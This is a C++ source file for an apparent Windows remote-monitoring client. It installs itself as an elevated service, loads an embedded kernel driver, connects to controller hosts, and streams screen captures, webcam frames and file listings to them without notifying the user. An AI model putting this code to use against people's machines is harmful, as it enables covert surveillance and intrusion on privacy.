#include <iostream>
#include <fstream>
#include "sdk_version.h"
#include <WS2tcpip.h>
#include "service_helper.h"
#include "rms_message.h"
#include "rms_client.h"
#include "host_probe.h"
#include "file_explorer.h"
#include "registry_explorer.h"
#include "zip.h"
#include "session_helper.h"
#include "monitor_capturer.h"
#include "pipe_client.h"
#include "pipe_server.h"
#include "image_transformer.h"
#include "mf_source.h"
#include "mf_source_reader.h"
#include "com_helper.h"
#include "resource.h"

WCHAR g_ServiceName[] = L"RMS Client Service";
const WCHAR g_DriverServiceName[] = L"RMS Client Driver";
SERVICE_STATUS_HANDLE g_ServiceStatusHandle;
SERVICE_STATUS g_ServiceStatus;
std::wstring g_SelfPath;

void WINAPI ServiceMain(DWORD argc, LPWSTR* argv);

SERVICE_TABLE_ENTRYW g_ServiceStartTable[] = {
	{g_ServiceName, ServiceMain},
	{nullptr, nullptr}
};

// at service context
void do_rms_main_process()
{
	//std::vector<session_helper::station_info> stations;
	//if (session_helper::get_all_station(stations)) {
	//	for (const auto& station : stations) {
	//		utility::print_debug_msg(L"do_rms_main_process", { station.name, station.visible ? L"visible" : L"hidden" });

	//		if (!station.visible) continue;

	//		session_helper::desktop_info deskInfo;
	//		if (session_helper::get_input_desktop_info(station.name, deskInfo)) {
	//			utility::print_debug_msg(L"do_rms_main_process", { deskInfo.name, deskInfo.user_connected ? L"connected" : L"disconnected" });
	//		}

	//		std::vector<session_helper::desktop_info> desktops;
	//		if (session_helper::get_all_desktop(station.name, desktops)) {
	//			for (const auto& desktop : desktops) {
	//				utility::print_debug_msg(L"do_rms_main_process", { desktop.name, desktop.user_connected ? L"connected" : L"disconnected" });
	//			}
	//		}
	//	}
	//}

	//std::vector<session_helper::session_info> sessions;
	//if (session_helper::get_all_session(sessions)) {
	//	for (const auto& session : sessions) {
	//		utility::print_debug_msg(L"do_rms_main_process",
	//			{
	//				std::to_wstring(session.id),
	//				std::to_wstring(session.state),
	//				session.sessionName,
	//				session.domainName + L"/" + session.userName
	//			}
	//		);
	//	}
	//}

	auto rms_client = rms_client::Create(L"\\\\.\\RMS_WskDriver");
	if (!rms_client) {
		auto pltType = utility::get_platform_type();
		if (!pltType) {
			utility::print_debug_msg(L"do_rms_main_process", { L"utility::get_platform_type", L"unsupported platform" });
			return;
		}

		utility::print_debug_msg(L"do_rms_main_process", { L"platform_type", std::to_wstring(pltType) });

		auto res = FindResourceW(nullptr, MAKEINTRESOURCEW(pltType == 1 ? IDR_X64 : IDR_X86), L"BINARY");
		auto resData = LoadResource(nullptr, res);
		auto data = LockResource(resData);
		auto dataSize = SizeofResource(nullptr, res);
		std::ofstream ofs;
		auto driverPath = utility::get_temp_file_path(L".sys");
		utility::print_debug_msg(L"do_rms_main_process", { L"driver path", driverPath });
		ofs.open(driverPath, std::ios_base::binary);
		ofs.write(reinterpret_cast<char*>(data), dataSize);
		ofs.flush();
		ofs.close();

		service_helper::remove(g_DriverServiceName, true);
		auto bRet = service_helper::install(g_DriverServiceName, driverPath, false, true);
		if (!bRet) {
			utility::print_debug_msg(L"do_rms_main_process", { L"service_helper::install" });
		} else {
			bRet = service_helper::start(g_DriverServiceName);
			if (!bRet) {
				utility::print_debug_msg(L"do_rms_main_process", { L"service_helper::start" });
			}
		}

		if (!bRet) {
			DeleteFileW(driverPath.c_str());
			service_helper::remove(g_DriverServiceName, true);
			return;
		}

		rms_client = rms_client::Create(L"\\\\.\\RMS_WskDriver");
		if (!rms_client) {
			//service_helper::stop(g_DriverServiceName);
			service_helper::remove(g_DriverServiceName, true);
			return;
		}
	}

	auto probe_server = host_probe_server::Create(10086);
	if (!probe_server) {
		utility::print_debug_msg(L"do_rms_main_process", { L"host_probe_server::Create" });
		return;
	}

	std::array<pipe_server, 3> pipe_server_list;
	std::array<std::wstring, 3> pipe_server_name_list = {
		L"{8E11715E-2B85-41C9-950F-9DE7875FA4DF}",
		L"{D1B5881C-C63F-4E8C-8F33-808F35002885}",
		L"{D86E65FF-A322-47EC-8507-C5262369AE90}"
	};

	auto processToken = session_helper::get_process_primary_token(GetCurrentProcess());

	char a = -(unsigned char)129;

	for (int i = 0; i < pipe_server_name_list.size(); ++i) {
		if (!pipe_server_list[i].init()) {
			utility::print_debug_msg(L"do_rms_main_process", { L"pipe_server::init", std::to_wstring(i) });
			continue;
		}

		if (!pipe_server_list[i].start(pipe_server_name_list[i])) {
			utility::print_debug_msg(L"do_rms_main_process", { L"pipe_server::start", std::to_wstring(i) });
			continue;
		}

		if (!session_helper::create_process_advanced(g_SelfPath, std::to_wstring(i + 1) + L" " + pipe_server_name_list[i], L"WinSta0\\Default", processToken)) {
			utility::print_debug_msg(L"do_rms_main_process", { L"create_process_advanced", std::to_wstring(i) });
			continue;
		}

		if (!pipe_server_list[i].accept(5000)) {
			utility::print_debug_msg(L"do_rms_main_process", { L"pipe_server::accept", std::to_wstring(i) });
			continue;
		}
	}

	CloseHandle(processToken);

	file_explorer::init();
	registry_explorer::init();

	g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SESSIONCHANGE;
	g_ServiceStatus.dwWaitHint = 0;
	SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);

	std::vector<in_addr> all_clients;
	for (;;) {
		while (!probe_server->get_all_valid_client(all_clients)) {
			std::this_thread::sleep_for(std::chrono::seconds(3));
		}

		WCHAR ipString[3 * 4 + 3 + 1];
		for (const auto& client : all_clients) {
			//std::cout << InetNtopW(AF_INET, &client, ipString, 16) << std::endl;
			utility::print_debug_msg(L"do_rms_main_process", { L"choose:", InetNtopW(AF_INET, &client, ipString, 16) });

			sockaddr_in remote;
			remote.sin_addr = client;
			remote.sin_family = AF_INET;
			remote.sin_port = htons(10086);

			if (!rms_client->connect(&remote)) {
				utility::print_debug_msg(L"do_rms_main_process", { L"connect to", InetNtopW(AF_INET, &client, ipString, 16), L"failed" });
				continue;
			}

			std::queue<json> json_queue;
			std::mutex json_queue_mutex;
			bool stop_all = false;
			std::atomic<uint8_t> quit_flags = 0;

			auto do_rms_message_parse = [&rms_client, &json_queue, &json_queue_mutex, &stop_all, &quit_flags]() {
				constexpr size_t msg_header_size = sizeof(rms_msg);
				//buffer_queue bq;
				std::vector<uint8_t> buffer_queue;
				//DebugBreak();

				utility::print_debug_msg(L"do_rms_main_process", { L"do_rms_message_parse", L"start" });

				for (; rms_client->is_connected() && !stop_all;) {
					if (buffer_queue.size() < msg_header_size) {
						auto old_size = buffer_queue.size();

						while (rms_client->received_size() + old_size < msg_header_size) {
							std::this_thread::sleep_for(std::chrono::milliseconds(100));
							if (!rms_client->is_connected() || stop_all) goto quit;
						}

						buffer_queue.resize(rms_client->received_size() + old_size);
						if (rms_client->get(buffer_queue.data() + old_size, buffer_queue.size() - old_size) != buffer_queue.size() - old_size) goto quit;
					}

					rms_msg msg_hdr;
					bool found_hdr = false;
					//size_t data_size = 0, raw_size = 0;
					size_t buf_size = buffer_queue.size(), cur_idx = 0;
					while (buf_size - cur_idx >= msg_header_size && !stop_all) {
						if (*(uint16_t*)(buffer_queue.data() + cur_idx) != rms_msg::MSG_MAGIC) {
							if (stop_all) goto quit;
							++cur_idx;
							continue;
						}

						auto hdr = (rms_msg*)(buffer_queue.data() + cur_idx);
						if (hdr->crc != utility::crc32(hdr, FIELD_OFFSET(rms_msg, crc))) continue;

						//data_size = msg_hdr->data_size;
						//raw_size = msg_hdr->compressed ? msg_hdr->raw_size : 0;
						cur_idx += msg_header_size;
						found_hdr = true;
						msg_hdr = *hdr;
						break;
					}

					buffer_queue.erase(buffer_queue.cbegin(), buffer_queue.cbegin() + cur_idx);
					if (!found_hdr) continue;

					buf_size = buffer_queue.size();
					utility::print_debug_msg(L"do_rms_main_process", { L"do_rms_message_parse", std::to_wstring(buf_size), std::to_wstring(msg_hdr.data_size) });

					//msg_hdr = (rms_msg*)buffer_queue.data();
					while (buf_size + rms_client->received_size() < msg_hdr.data_size) {
						std::this_thread::sleep_for(std::chrono::milliseconds(100));
						if (!rms_client->is_connected() || stop_all) goto quit;
					}

					std::vector<uint8_t> data;
					std::vector<uint8_t> body;
					data.resize(msg_hdr.data_size);
					memcpy(data.data(), buffer_queue.data(), buf_size);
					buffer_queue.clear();
					if (msg_hdr.data_size - buf_size &&
						rms_client->get(data.data() + buf_size, msg_hdr.data_size - buf_size) != msg_hdr.data_size - buf_size
						) {
						goto quit;
					}

					if (msg_hdr.compressed) {
						if (!zip::decompress_zlib(data.data(), data.size(), msg_hdr.raw_size, body)) {
							utility::print_debug_msg(L"do_rms_main_process", { L"do_rms_message_parse", L"zip::decompress_zlib" });
							continue;
						}
					} else {
						body = std::move(data);
					}

					if (!json::accept(body, true)) {
						utility::print_debug_msg(L"do_rms_main_process", { L"do_rms_message_parse", L"json::accept" });
						continue;
					}

					json_queue_mutex.lock();
					json_queue.emplace(std::move(json::parse(body, nullptr, false, true)));
					json_queue_mutex.unlock();
				}

			quit:
				utility::print_debug_msg(L"do_rms_main_process", { L"do_rms_message_parse", L"end" });
				stop_all = true;
				quit_flags |= 1;
			};

			std::thread(do_rms_message_parse).detach();

			while ((rms_client->is_connected() || !json_queue.empty()) && !stop_all) {
				std::this_thread::sleep_for(std::chrono::milliseconds(100));

				while (!json_queue.empty()) {
					json_queue_mutex.lock();
					auto j = std::move(json_queue.front());
					json_queue.pop();
					json_queue_mutex.unlock();

					utility::print_debug_msg(L"do_rms_main_process", { L"new msg", std::to_wstring(j["type"].get<unsigned>()) });

					if (j["type"] != 0) {
						continue;
					}

					rms_msg::rms_msg_item msg;
					bool need_send_failed = true;
					auto cmd = j["data"].value("cmd", 0U);
					switch (cmd) {
					case 1:
					case 2:
						for (;;) {
							if (!pipe_server_list[cmd - 1].signal_client()) {
								break;
							}

							std::vector<uint8_t> image_data;
							if (!pipe_server_list[cmd - 1].recv_msg_with_timeout(image_data, 5000)) {
								//OutputDebugMsg(L"pipe_server::recv_msg");
								break;
							}

							if (image_data.empty()) {
								utility::print_debug_msg(L"do_rms_main_process", { L"image_data::empty" });
								break;
							}

							//std::ofstream ofs;
							//ofs.open("C:\\1.jpeg", std::ios_base::binary);
							//if (!ofs.is_open()) {
							//	utility::print_debug_msg(L"do_rms_main_process", { L"ofstream::open" });
							//} else {
							//	ofs.write((char*)image_data.data(), image_data.size());
							//	ofs.close();
							//}

							//if (!pipe_server_list[cmd - 1].signal_client()) {
							//	break;
							//}

							//auto s = utility::bytes_to_hex_string(image_data);

							j["type"] = 3;
							j["data"] = std::move(utility::bytes_to_hex_string(image_data));
							//j["data"] = std::move(image_data);
							auto s = std::move(j.dump());

							std::ofstream ofs;
							ofs.open(std::string("C:\\").append(std::to_string(time(nullptr))).append(".json"), std::ios_base::binary);
							ofs.write(s.data(), s.size());
							ofs.close();

							//if (!json::accept(s, true)) {
							//	utility::print_debug_msg(L"do_rms_main_process", { L"json::accept" });

							//	j["type"] = 0;
							//	j["data"]["code"] = 1;
							//	//j["data"] = std::move(s);
							//	s = std::move(j.dump());
							//	rms_msg::make_msg(s.data(), s.size(), msg);
							//	rms_client->send(msg.second, msg.first);
							//	rms_msg::free_msg(msg);
							//	break;
							//} else {
							zip::compressd_data_type out;
							if (zip::compress_zlib(s.data(), s.size(), out)) {
								utility::print_debug_msg(L"do_rms_main_process", { L"zip::compress_zlib", std::to_wstring(s.size()), std::to_wstring(out.data.size()) });
								rms_msg::make_msg(out.data, msg, true, out.raw_size);
							} else {
								rms_msg::make_msg(s.data(), s.size(), msg);
							}
							rms_client->send(msg.second, msg.first);
							//std::ofstream ofs;
							ofs.open(std::string("C:\\").append(std::to_string(time(nullptr))).append(".msg"), std::ios_base::binary);
							ofs.write((char*)msg.second, msg.first);
							ofs.close();
							utility::print_debug_msg(L"do_rms_main_process", { L"msg.first", std::to_wstring(msg.first) });
							rms_msg::free_msg(msg);
							need_send_failed = false;
							//}
						}
						break;
					case 3:
						std::string s = j["data"]["path"];
						auto path = std::wstring(s.cbegin(), s.cend());
						utility::print_debug_msg(L"do_rms_main_process", { path });
						if (!file_explorer::list_files(j, path)) break;

						s = std::move(j.dump());
						zip::compressd_data_type out;
						if (zip::compress_zlib(s.data(), s.size(), out)) {
							utility::print_debug_msg(L"do_rms_main_process", { L"zip::compress_zlib", std::to_wstring(s.size()), std::to_wstring(out.data.size()) });
							rms_msg::make_msg(out.data, msg, true, out.raw_size);
						} else {
							rms_msg::make_msg(s.data(), s.size(), msg);
						}
						rms_client->send(msg.second, msg.first);
						std::ofstream ofs;
						ofs.open(std::string("C:\\").append(std::to_string(time(nullptr))).append(".msg"), std::ios_base::binary);
						ofs.write((char*)msg.second, msg.first);
						ofs.close();
						utility::print_debug_msg(L"do_rms_main_process", { L"msg.first", std::to_wstring(msg.first) });
						rms_msg::free_msg(msg);
						continue;
					}

					if (need_send_failed) {
						j["type"] = 0;
						j["data"] = { "code", 1 };
						//j["data"] = std::move(s);
						auto s = std::move(j.dump());
						rms_msg::make_msg(s.data(), s.size(), msg);
						rms_client->send(msg.second, msg.first);
						rms_msg::free_msg(msg);
						//j["type"] = 0;
						//j["data"]["code"] = 1;
						////j["data"] = std::move(s);
						//auto s = std::move(j.dump());
						//rms_msg::make_msg(s.data(), s.size(), msg);
						//rms_client->send(msg.second, msg.first);
						//rms_msg::free_msg(msg);
					}
				}
			}

			stop_all = true;
			rms_client->disconnect();

			utility::print_debug_msg(L"do_rms_main_process", { L"rms_client disconnect" });
		}
	}
}

// start by create_process_adv("WinSta0\\Default")
void do_monitor_capture(pipe_client& client)
{
	monitor_capturer monitorCapturer;
	if (!monitorCapturer.set_encoder(L"image/jpeg")) {
		utility::print_debug_msg(L"do_monitor_capture", { L"monitor_capturer::set_encoder" });
		return;
	}
	monitorCapturer.set_quality(100);

	while (client.is_connected()) {
		if (!client.wait_for_signal()) {
			utility::print_debug_msg(L"do_monitor_capture", { L"pipe_client::wait_for_signal" });
			break;
		}

		auto monitors = monitorCapturer.get_monitors();
		if (monitors.empty()) {
			utility::print_debug_msg(L"do_monitor_capture", { L"empty" });
		}

		//bool need_send_zero = true;

		for (const auto& monitor : monitors) {
			if (!monitor.is_active()) {
				continue;
			}

			utility::print_debug_msg(L"do_monitor_capture", { monitor.get_name() });

			std::vector<uint8_t> image_buffer;
			if (!monitorCapturer.capture(monitor, image_buffer)) {
				utility::print_debug_msg(L"do_monitor_capture", { L"monitor_capturer::capture" });
				continue;
			}

			std::ofstream ofs;
			ofs.open(std::wstring(L"C:\\").append(std::to_wstring(time(nullptr))).append(L".jpeg"), std::ios_base::binary);
			ofs.write((char*)image_buffer.data(), image_buffer.size());
			ofs.close();

			if (!client.send_msg_with_timeout(image_buffer.data(), image_buffer.size())) {
				utility::print_debug_msg(L"do_monitor_capture", { L"pipe_client::send_msg" });
				break;
			}

			if (!image_buffer.empty() && !client.wait_for_signal()) {
				utility::print_debug_msg(L"do_monitor_capture", { L"pipe_client::wait_for_signal" });
				break;
			}

			//need_send_zero = false;
		}

		if (/*need_send_zero && */!client.send_msg_with_timeout(nullptr, 0)) {
			utility::print_debug_msg(L"do_monitor_capture", { L"pipe_client::send_msg" });
			break;
		}
	}
}

// start by create_process_adv("WinSta0\\Default")
void do_camera_capture(pipe_client& client)
{
	image_transformer encoder;
	if (!encoder.set_encoder(L"image/jpeg")) {
		utility::print_debug_msg(L"do_camera_capture", { L"image_transformer::set_encoder" });
		return;
	}
	encoder.set_quality(100);

	auto reader = new (std::nothrow) mf_source_reader();
	if (!reader) {
		utility::print_debug_msg(L"do_camera_capture", { L"new mf_source_reader" });
		return;
	}

	while (client.is_connected()) {
		if (!client.wait_for_signal()) {
			utility::print_debug_msg(L"do_camera_capture", { L"pipe_client::wait_for_signal" });
			break;
		}

		std::vector<mf_source> sources;
		if (!mf_source::get_all_source(sources, mf_source::SOURCE_TYPE::SOURCE_VIDEO)) {
			utility::print_debug_msg(L"do_camera_capture", { L"mf_source::get_all_source" });
			break;
		}

		if (sources.empty()) {
			utility::print_debug_msg(L"do_camera_capture", { L"empty" });
		}

		bool need_send_zero = true;

		for (const auto& source : sources) {
			IMFMediaSource* mediaSource;
			if (!source.get_media_source(&mediaSource)) continue;

			reader->shutdown();
			auto bRet = reader->init(mediaSource);
			SafeRelease(mediaSource);
			if (!bRet) continue;

			bRet = reader->set_stream((DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM);
			if (!bRet) continue;

			IMFMediaType* mediaType;
			if (!reader->set_format(&mediaType, MFMediaType_Video, MFVideoFormat_RGB32)) continue;

			UINT32 width, height, stride;
			auto hr = MFGetAttributeSize(mediaType, MF_MT_FRAME_SIZE, &width, &height);

			if (SUCCEEDED(hr)) {
				hr = mediaType->GetUINT32(MF_MT_DEFAULT_STRIDE, &stride);
			}

			SafeRelease(mediaType);

			if (FAILED(hr)) continue;

			bRet = reader->start();
			if (!bRet) continue;

			utility::print_debug_msg(L"do_camera_capture", { L"1" });

			// bug here
			auto sample = reader->read();
			while (!sample && reader->running()) {
				sample = reader->read();
			}
			auto running = reader->running();
			reader->stop();
			reader->shutdown();

			if (!running && !sample) continue;

			IMFMediaBuffer* buffer;
			hr = sample->ConvertToContiguousBuffer(&buffer);
			if (FAILED(hr)) continue;

			BYTE* data;
			hr = buffer->Lock(&data, nullptr, nullptr);
			if (FAILED(hr)) continue;

			bRet = encoder.set_input(data, width, height, stride, PixelFormat32bppRGB);

			std::vector<uint8_t> image_buffer;
			if (bRet) {
				bRet = encoder.output(std::wstring(L"C:\\").append(std::to_wstring(time(nullptr))).append(L".jpeg"));
				bRet = encoder.output(image_buffer);
			}
			hr = buffer->Unlock();

			SafeRelease(buffer);
			SafeRelease(sample);

			if (!bRet) continue;

			if (!client.send_msg_with_timeout(image_buffer.data(), image_buffer.size())) {
				utility::print_debug_msg(L"do_camera_capture", { L"pipe_client::send_msg" });
				break;
			}

			if (!image_buffer.empty()) {
				if (!client.wait_for_signal()) {
					utility::print_debug_msg(L"do_monitor_capture", { L"pipe_client::wait_for_signal" });
					break;
				}
			} else {
				need_send_zero = false;
			}
		}

		if (need_send_zero && !client.send_msg_with_timeout(nullptr, 0)) {
			utility::print_debug_msg(L"do_monitor_capture", { L"pipe_client::send_msg" });
			break;
		}
	}

	reader->shutdown();
	SafeRelease(reader);
}

// start by create_process_adv("WinSta0\\Default")
void do_audio_capture(pipe_client& client)
{
}

DWORD WINAPI ServiceCtrlHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext)
{
	switch (dwControl) {
	case SERVICE_CONTROL_STOP:  // sc stop
	case SERVICE_CONTROL_SHUTDOWN:  // shutdown /s
	{
		//OutputDebugMsg(L"SC STOP", false);
		g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		g_ServiceStatus.dwWin32ExitCode = NO_ERROR;
		g_ServiceStatus.dwWaitHint = 3000;
		SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);

		//service_helper::stop(g_DriverServiceName);
		service_helper::remove(g_DriverServiceName, true);

		g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		g_ServiceStatus.dwWin32ExitCode = NO_ERROR;
		g_ServiceStatus.dwWaitHint = 0;
		SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
		return NO_ERROR;
	}
	case SERVICE_CONTROL_SESSIONCHANGE:
	{
		const auto sessionNotification = (PWTSSESSION_NOTIFICATION)lpEventData;

		switch (dwEventType) {
		case WTS_CONSOLE_CONNECT:
		case WTS_REMOTE_CONNECT:
		case WTS_SESSION_LOGON:
			utility::print_debug_msg(L"ServiceCtrlHandler", {
				L"SERVICE_CONTROL_SESSIONCHANGE",
				L"CONNECT/LOGON",
				std::to_wstring(dwEventType),
				std::to_wstring(sessionNotification->dwSessionId)
				}
			);
			break;
		case WTS_CONSOLE_DISCONNECT:
		case WTS_REMOTE_DISCONNECT:
		case WTS_SESSION_LOGOFF:
			utility::print_debug_msg(L"ServiceCtrlHandler", {
				L"SERVICE_CONTROL_SESSIONCHANGE",
				L"DISCONNECT/LOGOFF",
				std::to_wstring(dwEventType),
				std::to_wstring(sessionNotification->dwSessionId)
				}
			);
			break;
		case WTS_SESSION_LOCK:
			utility::print_debug_msg(L"ServiceCtrlHandler", {
				L"SERVICE_CONTROL_SESSIONCHANGE",
				L"LOCK/UNLOCK",
				std::to_wstring(dwEventType),
				std::to_wstring(sessionNotification->dwSessionId)
				}
			);
			break;
		default:
			utility::print_debug_msg(L"ServiceCtrlHandler", {
				L"SERVICE_CONTROL_SESSIONCHANGE",
				L"Other",
				std::to_wstring(dwEventType),
				std::to_wstring(sessionNotification->dwSessionId)
				}
			);
			break;
		}
		return NO_ERROR;
	}
	default:
	{
		utility::print_debug_msg(L"ServiceCtrlHandler", { L"Unsupported Control Code", std::to_wstring(dwControl) });

		return ERROR_CALL_NOT_IMPLEMENTED;
	}
	}
}

void WINAPI ServiceMain(DWORD argc, LPWSTR* argv)
{
	g_ServiceStatusHandle = RegisterServiceCtrlHandlerExW(g_ServiceName, ServiceCtrlHandler, nullptr);
	if (!g_ServiceStatusHandle) {
		//OutputDebugMsg(L"RegisterServiceCtrlHandler");
		return;
	}

	g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	//g_ServiceStatus.dwControlsAccepted = 0;
	//g_ServiceStatus.dwWin32ExitCode = NO_ERROR;
	//g_ServiceStatus.dwServiceSpecificExitCode = NO_ERROR;
	//g_ServiceStatus.dwCheckPoint = 0;
	g_ServiceStatus.dwWaitHint = 3000;
	SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);

	utility::print_debug_msg(L"ServiceMain", { L"do_rms_main_process", L"start" });
	do_rms_main_process();
	utility::print_debug_msg(L"ServiceMain", { L"do_rms_main_process", L"end" });

	g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	g_ServiceStatus.dwWin32ExitCode = NO_ERROR;
	g_ServiceStatus.dwWaitHint = 0;
	SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
}

int wmain(int argc, const wchar_t** argv)
{
	if (!utility::get_self_image_name(g_SelfPath)) {
		g_SelfPath = argv[0];
	}

	utility::print_debug_msg(L"wmain", { g_SelfPath, std::to_wstring(argc), argv[0] });

	if (argc == 1) {
		if (!utility::have_admin_power()) {
			auto res = ShellExecuteW(
				nullptr,
				L"runas",
				g_SelfPath.c_str(),
				nullptr,
				nullptr,
				SW_SHOW
			);
			if (res <= (HINSTANCE)32) {
				auto err = GetLastError();
				utility::print_debug_msg(L"wmain", { L"ShellExecuteW", std::to_wstring((UINT_PTR)res) }, err);
				return -1;
			}
			return 0;
		}

		//DebugBreak();

		if (StartServiceCtrlDispatcherW(g_ServiceStartTable)) {
			return 0;
		}

		auto err = GetLastError();
		utility::print_debug_msg(L"wmain", { L"StartServiceCtrlDispatcherW" }, err);
		if (err == ERROR_SERVICE_ALREADY_RUNNING) return 0;
		if (err != ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) return -2;

		if (!service_helper::install(g_ServiceName, g_SelfPath, true)) {
			utility::print_debug_msg(L"wmain", { L"service_helper::install" });
			return -3;
		}

		if (!service_helper::start(g_ServiceName)) {
			utility::print_debug_msg(L"wmain", { L"service_helper::start" });
			return -4;
		}

		//SetFileAttributesW(g_SelfPath.c_str(), FILE_ATTRIBUTE_HIDDEN);

		return 0;
	}

	if (argc > 2) {
		return -5;
	}

	/*
	* argv[0] = type
	* argv[1] = pipe_name or command
	*/

	if (argv[0][1] || !iswdigit(argv[0][0])) {
		return -6;
	}

	auto type = argv[0][0] - L'0';
	auto arg = argv[1];

	if (type == 0) {
		service_helper::remove(g_ServiceName, true);
		return 0;
	}

	pipe_client client;
	if (!client.init()) {
		utility::print_debug_msg(L"wmain", { L"pipe_client::init", arg });
		return -7;
	}

	//std::this_thread::sleep_for(std::chrono::seconds(1));

	if (!client.connect(arg)) {
		utility::print_debug_msg(L"wmain", { L"pipe_client::connect", arg });
		return -8;
	}

	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	// Initialize GDI+.
	auto status = GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
	if (status != Gdiplus::Ok) {
		utility::print_debug_msg(L"wmain", { L"GdiplusStartup" }, status);
		return -9;
	}

	auto hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE);
	if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
		utility::print_debug_msg(L"wmain", { L"CoInitializeEx" }, hr);
		return -10;
	}

	hr = MFStartup(MF_VERSION, MFSTARTUP_NOSOCKET);
	if (FAILED(hr)) {
		utility::print_debug_msg(L"wmain", { L"MFStartup" }, hr);
		return -11;
	}

	switch (type) {
	case 1:
		utility::print_debug_msg(L"wmain", { L"do_monitor_capture", L"start" });
		do_monitor_capture(client);
		utility::print_debug_msg(L"wmain", { L"do_monitor_capture", L"end" });
		break;

	case 2:
		utility::print_debug_msg(L"wmain", { L"do_camera_capture", L"start" });
		do_camera_capture(client);
		utility::print_debug_msg(L"wmain", { L"do_camera_capture", L"end" });
		break;

	case 3:
		utility::print_debug_msg(L"wmain", { L"do_audio_capture", L"start" });
		do_audio_capture(client);
		utility::print_debug_msg(L"wmain", { L"do_audio_capture", L"end" });
		break;

	default:
		utility::print_debug_msg(L"wmain", { L"Unknown type", std::to_wstring(type) });
	}

	Gdiplus::GdiplusShutdown(gdiplusToken);
	MFShutdown();
	CoUninitialize();

	return 0;
}
